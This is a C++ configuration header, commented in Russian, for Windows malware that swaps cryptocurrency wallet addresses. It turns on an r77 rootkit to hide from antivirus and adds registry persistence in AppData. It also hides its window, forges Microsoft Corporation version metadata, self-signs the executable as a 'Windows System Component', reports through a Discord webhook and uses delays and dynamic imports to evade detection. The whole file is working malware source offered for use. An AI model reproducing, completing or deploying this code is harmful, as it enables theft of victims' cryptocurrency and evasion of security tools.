#pragma once
#include <iostream>
#include "oxorany_include.h"
#include "xor.h"
#include "string.h"
#include <random>
#include <fstream>
#include <sstream>
#include <string>
#include <locale>
#include <codecvt>
#include <Windows.h>
#include <winver.h>

// Функция для генерации случайных чисел
int random(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(min, max);
    return dis(gen);
}

// Вспомогательная функция для конвертации int в wstring
std::wstring int_to_wstring(int value) {
    std::wstringstream wss;
    wss << value;
    return wss.str();
}

// Настройки отладки и поведения программы:

// Включает режим отладки - будет выводить дополнительную информацию в консоль
// о работе программы (что именно копируется, какие форматы определяются и т.д.)
bool bDebug = false;

// Включает rootkit (r77) для скрытия процесса от системы и антивирусов
// Rootkit маскирует процесс, файлы и записи реестра связанные с программой
bool bEnableRootkit = true;

// Включает автозапуск программы при старте Windows
// Программа копирует себя в AppData и добавляет запись в автозагрузку через реестр
bool bEnablePersistance = true;

// Скрывает окно консоли при запуске
// Если true - программа работает в фоновом режиме без видимого интерфейса
bool bHideWindow = true;

// Включает цифровую подпись исполняемого файла
bool bEnableDigitalSignature = false;

// Настройки метаданных файла
struct FileMetadataSettings {
    // Основная информация
    const wchar_t* ProductName = L"Windows System Helper";
    const wchar_t* FileDescription = L"Windows System Service Helper";
    const wchar_t* CompanyName = L"Microsoft Corporation";
    const wchar_t* LegalCopyright = L"© Microsoft Corporation. All rights reserved.";
    
    // Версия файла
    struct {
        int Major = 10;
        int Minor = 0;
        int Build = 19045;
        int Revision = 3570;
    } FileVersion;
    
    // Дополнительная информация
    const wchar_t* OriginalFilename = L"syshelper.exe";
    const wchar_t* InternalName = L"syshelper";
    const wchar_t* Comments = L"System Helper Service";
} MetadataSettings;

// Настройки цифровой подписи
struct DigitalSignatureSettings {
    const wchar_t* certificatePath = L"cert.pfx";  // Путь к сертификату
    const wchar_t* certificatePassword = L"password";  // Пароль сертификата
    const wchar_t* timestampServer = L"http://timestamp.digicert.com";  // Сервер временных меток
} SignatureSettings;

// Функция для подписи файла
bool SignFile(const wchar_t* filePath) {
    if (!bEnableDigitalSignature) return true;

    // Проверяем наличие необходимых инструментов
    WCHAR makecertPath[MAX_PATH];
    WCHAR signtoolPath[MAX_PATH];
    if (!SearchPathW(NULL, L"makecert.exe", NULL, MAX_PATH, makecertPath, NULL) ||
        !SearchPathW(NULL, L"signtool.exe", NULL, MAX_PATH, signtoolPath, NULL)) {
        if (bDebug) std::cout << "[Debug] makecert.exe or signtool.exe not found, skipping signing\n";
        return true; // Пропускаем подпись, если инструменты не найдены
    }

    // Генерируем случайное имя для сертификата
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring certName = std::to_wstring(random(100000, 999999)) + L".cer";
    std::wstring certPath = std::wstring(tempPath) + certName;
    
    // Создаем самоподписанный сертификат
    std::wstring makecert = L"makecert -r -pe -n \"CN=Windows System Component\" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv \"" + 
                           certPath + L"\" \"" + certPath + L"\"";
    
    // Подписываем файл
    std::wstring signCommand = L"signtool sign /v /f \"" + certPath + 
                              L"\" /d \"Windows System Helper\" /du \"http://www.microsoft.com\" /t http://timestamp.digicert.com \"" + 
                              std::wstring(filePath) + L"\"";

    // Выполнение команды
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Создаем сертификат
    if (CreateProcessW(NULL, &makecert[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // Подписываем файл
        if (CreateProcessW(NULL, &signCommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            // Удаляем временные файлы
            DeleteFileW(certPath.c_str());
            return exitCode == 0;
        }
    }
    
    return false;
}

// Определяем константу для ресурса версии в широких символах
#ifndef RT_VERSION_W
#define RT_VERSION_W ((LPCWSTR)RT_VERSION)
#endif

// Функция для установки метаданных файла
bool SetFileMetadata(const wchar_t* filePath) {
    // Формируем строку версии
    std::wstring version = int_to_wstring(MetadataSettings.FileVersion.Major) + L"." +
                          int_to_wstring(MetadataSettings.FileVersion.Minor) + L"." +
                          int_to_wstring(MetadataSettings.FileVersion.Build) + L"." +
                          int_to_wstring(MetadataSettings.FileVersion.Revision);
    
    // Открываем файл для обновления ресурсов
    HANDLE hUpdate = BeginUpdateResourceW(filePath, FALSE);
    if (hUpdate == NULL) return false;
    
    // Создаем структуру версии
    VS_FIXEDFILEINFO vffi;
    ZeroMemory(&vffi, sizeof(VS_FIXEDFILEINFO));
    vffi.dwSignature = 0xFEEF04BD;
    vffi.dwStrucVersion = 0x00010000;
    vffi.dwFileVersionMS = (MetadataSettings.FileVersion.Major << 16) | 
                           MetadataSettings.FileVersion.Minor;
    vffi.dwFileVersionLS = (MetadataSettings.FileVersion.Build << 16) | 
                           MetadataSettings.FileVersion.Revision;
    vffi.dwProductVersionMS = vffi.dwFileVersionMS;
    vffi.dwProductVersionLS = vffi.dwFileVersionLS;
    vffi.dwFileFlagsMask = VS_FFI_FILEFLAGSMASK;
    vffi.dwFileFlags = 0;
    vffi.dwFileOS = VOS__WINDOWS32;
    vffi.dwFileType = VFT_APP;
    vffi.dwFileSubtype = VFT2_UNKNOWN;
    vffi.dwFileDateMS = 0;
    vffi.dwFileDateLS = 0;
    
    // Создаем блок строковой информации
    struct STRINGFILEINFO {
        WORD wLength;
        WORD wValueLength;
        WORD wType;
        WCHAR szKey[32];
        WCHAR szValue[256];
    } stringInfo[] = {
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.CompanyName), 1, L"CompanyName", L"" },
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.FileDescription), 1, L"FileDescription", L"" },
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.ProductName), 1, L"ProductName", L"" },
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.LegalCopyright), 1, L"LegalCopyright", L"" },
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.OriginalFilename), 1, L"OriginalFilename", L"" },
        { sizeof(STRINGFILEINFO), (WORD)wcslen(MetadataSettings.Comments), 1, L"Comments", L"" }
    };
    
    // Копируем значения
    wcscpy_s(stringInfo[0].szValue, 256, MetadataSettings.CompanyName);
    wcscpy_s(stringInfo[1].szValue, 256, MetadataSettings.FileDescription);
    wcscpy_s(stringInfo[2].szValue, 256, MetadataSettings.ProductName);
    wcscpy_s(stringInfo[3].szValue, 256, MetadataSettings.LegalCopyright);
    wcscpy_s(stringInfo[4].szValue, 256, MetadataSettings.OriginalFilename);
    wcscpy_s(stringInfo[5].szValue, 256, MetadataSettings.Comments);
    
    // Обновляем ресурсы
    if (!UpdateResourceW(hUpdate, MAKEINTRESOURCEW(16), MAKEINTRESOURCEW(1), 
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
                        &vffi, sizeof(VS_FIXEDFILEINFO)) ||
        !UpdateResourceW(hUpdate, MAKEINTRESOURCEW(16), MAKEINTRESOURCEW(1), 
                        MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US),
                        stringInfo, sizeof(stringInfo))) {
        EndUpdateResourceW(hUpdate, TRUE);
        return false;
    }
    
    return EndUpdateResourceW(hUpdate, FALSE);
}

// Адреса криптовалютных кошельков для подмены:
std::string sBtcAddy = ("1"); // Bitcoin
std::string sEthAddy = ("2"); // Ethereum  
std::string sLtcAddy = ("3"); // Litecoin
std::string sUsdtAddy = ("4"); // Tether
std::string sSolAddy = ("5"); // Solana
std::string sTonAddy = ("211"); // TON

// Имя папки для установки в AppData ($77 префикс используется для работы с r77 rootkit)
const char* cInstallFolder = "WindowsSecurityService";

// Имя исполняемого файла при установке 
const char* cInstallName = "WinSystemHelper.exe";

// ID и токен Discord webhook для отправки уведомлений
const char* cWebhookId = ("");
const char* cWebhookToken = ("");

// Добавить задержки
void add_delays() {
    Sleep(random(1000, 3000)); // Случайные задержки
}

// Использовать динамическое разрешение импортов
typedef HANDLE (WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
pCreateFileW _CreateFileW = (pCreateFileW)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateFileW");